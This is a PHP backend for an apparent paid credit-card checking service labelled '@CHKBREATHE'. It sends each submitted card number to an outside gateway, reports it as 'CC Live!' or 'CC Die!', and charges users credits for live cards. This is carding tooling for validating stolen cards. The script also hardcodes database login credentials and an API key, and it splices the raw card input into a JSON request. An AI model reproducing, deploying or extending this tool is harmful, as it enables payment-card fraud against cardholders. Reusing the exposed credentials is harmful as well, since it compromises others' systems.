<?php

error_reporting(0);
session_start();

if (!isset($_SESSION["user_id"])) {
    header("Location: /user/sign-in");
    exit;
}

try {
    $connection = new PDO("mysql:host=db5018661323.hosting-data.io;dbname=dbs14784496", "dbu2919208", "Pelucas09.");
} catch (PDOException $e) {
    exit("Error: " . $e->getMessage());
}

$user = $_SESSION["user_id"];

$query = $connection->prepare("SELECT * FROM breathe_users WHERE id=:id");
$query->bindParam("id", $user, PDO::PARAM_STR);
$query->execute();
$result = $query->fetch(PDO::FETCH_ASSOC);

$credits = $result["creditos"];

if ($credits <= 0) {
    echo json_encode(["status" => "Error", "css" => "Creditos insuficientes"]);
    exit;
}

$ch = curl_init("https://btrk/api/gateways/1.1");

curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_POSTFIELDS     => '{"card":"' . $_POST["cc"] . '","key":"ABS-9TH-0YD-9D6"}',
]);

$request = curl_exec($ch);
curl_close($ch);

$data     = json_decode($request);
$status   = $data->status;
$response = $data->message;
$info     = $data->bin;

if ($status == 1) {
    $title = "CC Live!";
    $price = 4;
} else if ($status == 2) {
    $title = "CC Die!";
    $price = 0;
} else if ($status == 3) {
    $title = "Proxy Muerto!";
} else {
    $title = "Error!";
}

if ($status == 1 or $status == 2) {
    $balance = $credits - $price;
    $query = $connection->prepare("UPDATE breathe_users SET creditos=:creditos WHERE id=:id");
    $query->bindParam("id", $user, PDO::PARAM_STR);
    $query->bindParam("creditos", $balance, PDO::PARAM_STR);
    $query->execute();
}

echo json_encode(["status" => $title, "css" => $_POST["cc"] . " | " . $response . " | " . $info . " | @CHKBREATHE"]);